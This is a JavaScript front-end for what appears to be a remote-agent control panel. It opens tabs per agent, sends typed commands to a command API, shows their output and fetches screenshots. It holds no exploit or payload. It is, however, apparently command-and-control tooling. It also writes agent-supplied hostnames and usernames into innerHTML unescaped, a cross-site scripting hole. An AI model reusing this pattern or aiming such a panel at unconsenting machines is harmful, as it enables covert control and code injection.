let openTabs = [];
let activeTabUuid = null;

function openTab(uuid) {
    if (openTabs.includes(uuid)) {
        activateTab(uuid);
        return;
    }

    const agent = currentAgents[uuid];
    if (!agent) return;

    const placeholder = document.getElementById('tabs-placeholder');
    if (placeholder) placeholder.classList.add('hidden');

    openTabs.push(uuid);

    const tabsBar = document.getElementById('tabs-bar');
    const tabBtn = document.createElement('div');
    tabBtn.id = `tab-btn-${uuid}`;
    tabBtn.className = 'tab-btn flex items-center gap-2 cursor-pointer select-none';
    tabBtn.innerHTML = `
        <span class="tab-btn-label flex items-center gap-2" onclick="activateTab('${uuid}')">
            <span class="tab-btn-dot w-2 h-2 rounded-full flex-shrink-0 ${isAgentOnline(agent.last_seen) ? 'bg-green-500' : 'bg-red-500'}"></span>
            <span class="truncate max-w-[120px]">${agent.hostname || 'Unknown'}</span>
            <span class="tab-btn-user text-xs opacity-60 truncate max-w-[80px]">${agent.username || ''}</span>
        </span>
        <button onclick="event.stopPropagation(); closeTab('${uuid}')" class="tab-btn-close" title="Close">
            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
            </svg>
        </button>
    `;
    tabsBar.appendChild(tabBtn);

    const tabsContent = document.getElementById('tabs-content');
    const panel = createConsolePanel(uuid, agent);
    tabsContent.appendChild(panel);

    activateTab(uuid);
}

function activateTab(uuid) {
    openTabs.forEach(id => {
        const btn = document.getElementById(`tab-btn-${id}`);
        const panel = document.getElementById(`tab-panel-${id}`);
        if (btn) btn.classList.remove('active');
        if (panel) panel.classList.add('hidden');
    });

    const btn = document.getElementById(`tab-btn-${uuid}`);
    const panel = document.getElementById(`tab-panel-${uuid}`);
    if (btn) btn.classList.add('active');
    if (panel) panel.classList.remove('hidden');

    activeTabUuid = uuid;

    setTimeout(() => {
        const input = document.getElementById(`command-input-${uuid}`);
        if (input) input.focus();
    }, 50);
}

function createConsolePanel(uuid, agent) {
    const panel = document.createElement('div');
    panel.id = `tab-panel-${uuid}`;
    panel.className = 'flex-1 flex flex-col overflow-hidden console-tab p-4';

    panel.innerHTML = `
        <div class="flex justify-between items-center mb-3 flex-shrink-0">
            <div class="flex items-center gap-3">
                <div id="panel-dot-${uuid}" class="w-3 h-3 rounded-full ${isAgentOnline(agent.last_seen) ? 'bg-green-500 animate-pulse' : 'bg-red-500'}"></div>
                <h3 class="text-lg font-bold text-white">${agent.hostname || 'Unknown'}</h3>
                <span class="text-sm text-gray-400 bg-gray-700 px-3 py-1 rounded-full">
                    ${agent.username || 'Unknown'}@${agent.domain || 'WORKGROUP'}
                </span>
                <span class="text-xs font-mono text-gray-500">${uuid.substring(0, 8)}...</span>
            </div>
            <div class="flex items-center gap-2">
                <button
                    onclick="switchAgentTab('${uuid}', 'console')"
                    id="console-tab-btn-${uuid}"
                    class="px-3 py-1 text-sm text-blue-400 border-b-2 border-blue-500 font-medium">
                    Console
                </button>
                <button
                    onclick="switchAgentTab('${uuid}', 'screenshot')"
                    id="screenshot-tab-btn-${uuid}"
                    class="px-3 py-1 text-sm text-gray-400 hover:text-gray-300">
                    Screenshot
                </button>
            </div>
        </div>

        <div id="console-content-${uuid}" class="flex-1 flex flex-col overflow-hidden">
            <div class="bg-black rounded-lg border border-gray-600 overflow-hidden shadow-lg flex-1 flex flex-col">
                <div class="bg-gray-800 px-4 py-2 text-sm text-gray-300 border-b border-gray-600 flex justify-between items-center flex-shrink-0">
                    <span class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                        Console
                    </span>
                    <button onclick="sendQuickHelp('${uuid}')" class="text-xs bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded transition-all duration-200" title="Show commands (F1 or Ctrl+H)">
                        Help
                    </button>
                </div>
                <div class="console-container flex-1 flex flex-col overflow-hidden">
                    <pre id="console-output-${uuid}" class="text-green-400 p-4 text-sm leading-relaxed flex-1 overflow-y-auto" style="font-family: 'Courier New', monospace;">${agent.cmdout || 'Console started.\n\nType "help" to see available commands.\nShortcuts: F1 or Ctrl+H for quick help.'}</pre>
                    <div class="console-input-line flex items-center px-4 pb-2 w-full flex-shrink-0">
                        <span class="text-green-400 mr-2">></span>
                        <input
                            type="text"
                            id="command-input-${uuid}"
                            class="flex-1 bg-black border-none text-green-400 p-0 focus:outline-none text-sm"
                            placeholder="Type command here..."
                            autocomplete="off"
                            onkeydown="handleConsoleInput(event, '${uuid}')"
                            style="font-family: 'Courier New', monospace;"
                        />
                    </div>
                </div>
            </div>
        </div>

        <div id="screenshot-content-${uuid}" class="hidden flex-1 flex flex-col overflow-hidden">
            <div class="bg-black rounded-lg border border-gray-600 overflow-hidden shadow-lg flex-1 flex flex-col">
                <div class="bg-gray-800 px-4 py-2 text-sm text-gray-300 border-b border-gray-600 flex justify-between items-center flex-shrink-0">
                    <span class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
                        Screenshot Viewer
                    </span>
                    <button
                        onclick="checkExistingScreenshot('${uuid}')"
                        class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition-all duration-200 flex items-center gap-1">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd" />
                        </svg>
                        Refresh
                    </button>
                </div>
                <div id="screenshot-container-${uuid}" class="flex-1 flex items-center justify-center overflow-hidden">
                    <div class="text-center text-gray-500 w-full">
                        <p>No screenshot available</p>
                        <p class="text-sm mt-2">To view screenshot, run 'screenshot' command</p>
                    </div>
                </div>
            </div>
        </div>
    `;

    setTimeout(() => {
        const commandInput = document.getElementById(`command-input-${uuid}`);
        if (commandInput) commandInput.focus();
    }, 100);

    return panel;
}

function handleConsoleInput(event, uuid) {
    const commandInput = document.getElementById(`command-input-${uuid}`);

    if (event.key === 'Enter') {
        event.preventDefault();
        const command = commandInput.value.trim();

        if (command) {
            sendCommand(uuid, command);
            commandInput.value = '';
        }
    } else if (event.key === 'F1') {
        event.preventDefault();
        commandInput.value = '';
        sendCommand(uuid, 'help');
    } else if ((event.ctrlKey || event.metaKey) && event.key === 'h') {
        event.preventDefault();
        sendQuickHelp(uuid);
    }
}

async function sendCommand(uuid, command) {
    if (!command) return;

    try {
        const formData = new FormData();
        formData.append('command', command);

        const consoleOutput = document.getElementById(`console-output-${uuid}`);
        const currentOutput = consoleOutput.textContent;

        if (command.toLowerCase() === 'help') {
            consoleOutput.textContent = currentOutput + `\n\n> ${command}\n[Loading documentation...]`;
        } else {
            consoleOutput.textContent = currentOutput + `\n\n> ${command}\n[Command sent to agent, waiting for response...]`;
        }
        consoleOutput.scrollTop = consoleOutput.scrollHeight;

        const response = await fetch(`${CONFIG.API.COMMAND}/${uuid}`, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            setTimeout(fetchData, command.toLowerCase() === 'help' ? 200 : 500);
            const commandInput = document.getElementById(`command-input-${uuid}`);
            if (commandInput) commandInput.focus();
        } else {
            alert('Error sending command');
        }
    } catch (error) {
        alert('Error sending command');
    }
}

async function sendQuickHelp(uuid) {
    try {
        const formData = new FormData();
        formData.append('command', 'help');

        const consoleOutput = document.getElementById(`console-output-${uuid}`);
        const currentOutput = consoleOutput.textContent;
        consoleOutput.textContent = currentOutput + `\n\n> help\n[Loading command list...]`;

        const response = await fetch(`${CONFIG.API.COMMAND}/${uuid}`, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            setTimeout(fetchData, 150);
            const commandInput = document.getElementById(`command-input-${uuid}`);
            if (commandInput) commandInput.focus();
        } else {
            consoleOutput.textContent = currentOutput + `\n\n> help\n[Error loading help]`;
            alert('Error requesting help');
        }
    } catch (error) {
        const consoleOutput = document.getElementById(`console-output-${uuid}`);
        const currentOutput = consoleOutput.textContent;
        consoleOutput.textContent = currentOutput + `\n\n> help\n[Connectivity error]`;
        alert('Error requesting help');
    }
}

function closeTab(uuid) {
    const btn = document.getElementById(`tab-btn-${uuid}`);
    const panel = document.getElementById(`tab-panel-${uuid}`);
    if (btn) btn.remove();
    if (panel) panel.remove();

    openTabs = openTabs.filter(id => id !== uuid);

    if (activeTabUuid === uuid) {
        if (openTabs.length > 0) {
            activateTab(openTabs[openTabs.length - 1]);
        } else {
            activeTabUuid = null;
            const placeholder = document.getElementById('tabs-placeholder');
            if (placeholder) placeholder.classList.remove('hidden');
        }
    }
}

function updateTabOutputs(agents) {
    agents.forEach(agent => {
        if (!openTabs.includes(agent.uuid)) return;

        const consoleOutput = document.getElementById(`console-output-${agent.uuid}`);
        if (consoleOutput) {
            const newContent = agent.cmdout || 'Waiting for commands...';
            if (consoleOutput.textContent === newContent) return;

            const scrollTop = consoleOutput.scrollTop;
            const scrollHeight = consoleOutput.scrollHeight;
            const clientHeight = consoleOutput.clientHeight;
            const wasAtBottom = (scrollHeight - scrollTop - clientHeight) < 30;

            consoleOutput.textContent = newContent;

            if (wasAtBottom) {
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
            } else {
                consoleOutput.scrollTop = scrollTop;
            }
        }

        const online = isAgentOnline(agent.last_seen);
        const dot = document.querySelector(`#tab-btn-${agent.uuid} .tab-btn-dot`);
        if (dot) {
            dot.classList.toggle('bg-green-500', online);
            dot.classList.toggle('bg-red-500', !online);
        }
        const panelDot = document.getElementById(`panel-dot-${agent.uuid}`);
        if (panelDot) {
            panelDot.classList.toggle('bg-green-500', online);
            panelDot.classList.toggle('animate-pulse', online);
            panelDot.classList.toggle('bg-red-500', !online);
        }
    });
}